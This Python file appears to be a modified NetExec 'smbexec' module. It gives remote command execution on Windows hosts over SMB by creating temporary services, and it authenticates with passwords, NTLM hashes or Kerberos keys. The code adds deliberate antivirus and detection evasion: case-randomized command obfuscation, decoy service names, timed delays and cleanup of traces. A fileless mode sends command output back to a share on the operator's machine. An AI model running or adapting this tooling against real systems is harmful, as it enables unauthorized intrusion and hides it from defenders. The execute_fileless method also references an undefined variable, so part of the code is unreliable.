import os
from os.path import join as path_join
from time import sleep
from datetime import datetime
import random
from impacket.dcerpc.v5 import transport, scmr
from nxc.helpers.misc import gen_random_string, PLAUSIBLE_SERVICE_NAMES, countdown_timer
from nxc.paths import TMP_PATH
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE


def randomize_case(s):
    """Randomizes the case of each character in a string."""
    return "".join(random.choice([c.upper(), c.lower()]) for c in s)


class SMBEXEC:
    def __init__(self, host, share_name, smbconnection, username="", password="", domain="", doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None):
        self.__host = host
        self.__share_name = share_name
        self.__port = port
        self.__username = username
        self.__password = password

        # Choose a random plausible name and append timestamp for the service name
        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        self.__serviceName = f"{chosen_name}_{timestamp}"

        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__batchFile = None
        self.__outputBuffer = b""
        self.__shell = "%COMSPEC% /Q /c "
        self.__retOutput = False
        self.__rpctransport = None
        self.__scmr = None
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = f"ncacn_np:{self.__host}[\\pipe\\svcctl]"
        self.logger.debug(f"StringBinding {stringbinding}")
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)

        if hasattr(self.__rpctransport, "setRemoteHost"):
            self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            self.__scmr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__scmr.connect()
        s = self.__rpctransport.get_smb_connection()
        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp["lpScHandle"]

    def execute(self, command, output=False):
        self.__retOutput = output
        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.execute_remote(c.strip())
        else:
            self.execute_remote(command)
        self.finish()
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_remote(self, data):
        # Generate output and batch file names based on plausible names and timestamp
        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        # Added microseconds for higher uniqueness between calls
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")
        base_name = f"{chosen_name}_{timestamp}"
        self.__output = f"{base_name}_out"
        self.__batchFile = f"{base_name}_batch.bat"

        # Randomize COMSPEC capitalization for obfuscation
        comspec_var = f"%{randomize_case('COMSPEC')}%".strip('%') # Remove % temporarily for f-string parsing
        # Randomize other keywords, flags, and env vars
        echo_cmd = randomize_case('echo')
        del_cmd = randomize_case('del') # We'll replace this with move later, but keep randomization logic
        move_cmd = randomize_case('move')
        q_flag = randomize_case('/Q')
        c_flag = randomize_case('/c')
        localappdata_var = f"%{randomize_case('LOCALAPPDATA')}%".strip('%')
        computername_var = f"%{randomize_case('COMPUTERNAME')}%".strip('%')

        # Re-add % for the final command string
        comspec_var = f'%{comspec_var}%'
        localappdata_var = f'%{localappdata_var}%'
        computername_var = f'%{computername_var}%'

        # Use move /y ... NUL instead of del
        delete_logic = f"{move_cmd} /y {localappdata_var}\\{self.__batchFile} NUL"

        command = f"{comspec_var} {q_flag} {c_flag} {echo_cmd} {data} ^> \\\\{computername_var}\\{self.__share}\\{self.__output} 2^>^&1 > {localappdata_var}\\{self.__batchFile} & {comspec_var} {q_flag} {c_flag} {localappdata_var}\\{self.__batchFile} & {comspec_var} {q_flag} {c_flag} {delete_logic}" if self.__retOutput else f"{comspec_var} {q_flag} {c_flag} {data}"

        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
            batch_file.write(command)

        self.logger.debug("Hosting batch file with command: " + command)
        self.logger.debug("Command to execute: " + command)
        self.logger.debug(f"Remote service {self.__serviceName} created.")

        try:
            # Introduce delay before creating service
            if not self.logger.args.no_delays:
                self.logger.debug("Applying delay before creating service")
                countdown_timer()
            self.logger.debug(f"Creating remote service {self.__serviceName}")
            resp = scmr.hRCreateServiceW(
                self.__scmr,
                self.__scHandle,
                self.__serviceName,
                self.__serviceName,
                lpBinaryPathName=command,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            service = resp["lpServiceHandle"]
        except Exception as e:
            if "rpc_s_access_denied" in str(e):
                self.logger.fail("SMBEXEC: Create services got blocked.")
            else:
                self.logger.fail(str(e))

            return self.__outputBuffer

        try:
            # Introduce delay before starting service
            if not self.logger.args.no_delays:
                self.logger.debug("Applying delay before starting service")
                countdown_timer()
            self.logger.debug(f"Starting remote service {self.__serviceName}")
            scmr.hRStartServiceW(self.__scmr, service)
        except Exception:
            pass

        try:
            # Introduce delay before deleting service
            if not self.logger.args.no_delays:
                self.logger.debug("Applying delay before deleting service")
                countdown_timer()
            self.logger.debug(f"Deleting remote service {self.__serviceName}")
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception:
            pass

        self.get_output_remote()

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ""
            return

        tries = 1
        while True:
            try:
                self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if tries >= self.__tries:
                    self.logger.fail("SMBEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                    break
                if "STATUS_BAD_NETWORK_NAME" in str(e):
                    self.logger.fail(f"SMBEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                    break
                elif "STATUS_VIRUS_INFECTED" in str(e):
                    self.logger.fail("Command did not run because a virus was detected")
                    break
                # When executing powershell and the command is still running, we get a sharing violation
                # We can use that information to wait longer than if the file is not found (probably av or something)
                if "STATUS_SHARING_VIOLATION" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} is still in use with {self.__tries - tries} tries left, retrying...")
                    tries += 1
                    sleep(1)
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} not found with {self.__tries - tries} tries left, deducting 10 tries and retrying...")
                    tries += 10
                    sleep(1)
                else:
                    self.logger.debug(f"Exception when trying to read output file: {e!s}. {self.__tries - tries} tries left, retrying...")
                    tries += 1
                    sleep(1)

        try:
            self.logger.debug(f"Deleting file {self.__share}\\{self.__output}")
            self.__smbconnection.deleteFile(self.__share, self.__output)
        except Exception:
            pass

    def execute_fileless(self, data):
        # Generate output and batch file names based on plausible names and timestamp
        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        # Added microseconds for higher uniqueness between calls
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")
        base_name = f"{chosen_name}_{timestamp}"
        self.__output = f"{base_name}_out"
        self.__batchFile = f"{base_name}_batch.bat"

        # Randomize COMSPEC capitalization for obfuscation
        comspec_var = f"%{randomize_case('COMSPEC')}%".strip('%') # Remove % temporarily for f-string parsing
        # Randomize flags
        q_flag = randomize_case('/Q')
        c_flag = randomize_case('/c')
        # Re-add % for the final command string
        comspec_var = f'%{comspec_var}%'

        local_ip = self.__rpctransport.get_socket().getsockname()[0]

        # Command written to the local batch file (uses echo)
        local_batch_command = f"{comspec_var} {q_flag} {c_flag} {data} ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else f"{comspec_var} {q_flag} {c_flag} {data}"
        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
            batch_file.write(local_batch_command)

        self.logger.debug("Hosting batch file with command: " + local_batch_command)
        self.logger.debug("Command to execute: " + command)

        # Introduce delay before creating service
        if not self.logger.args.no_delays:
            self.logger.debug("Applying delay before creating service")
            countdown_timer()
        self.logger.debug(f"Creating remote service {self.__serviceName}")
        resp = scmr.hRCreateServiceW(
            self.__scmr,
            self.__scHandle,
            self.__serviceName,
            self.__serviceName,
            lpBinaryPathName=command,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service = resp["lpServiceHandle"]

        try:
            # Introduce delay before starting service
            if not self.logger.args.no_delays:
                self.logger.debug("Applying delay before starting service")
                countdown_timer()
            self.logger.debug(f"Starting remote service {self.__serviceName}")
            scmr.hRStartServiceW(self.__scmr, service)
        except Exception:
            pass
        # Introduce delay before deleting service
        if not self.logger.args.no_delays:
            self.logger.debug("Applying delay before deleting service")
            countdown_timer()
        self.logger.debug(f"Deleting remote service {self.__serviceName}")
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_fileless()

    def get_output_fileless(self):
        if not self.__retOutput:
            return

        while True:
            try:
                with open(path_join(TMP_PATH, self.__output), "rb") as output:
                    self.output_callback(output.read())
                break
            except OSError:
                sleep(2)

    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpctransport.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp["lpScHandle"]
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp["lpServiceHandle"]
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception:
            pass
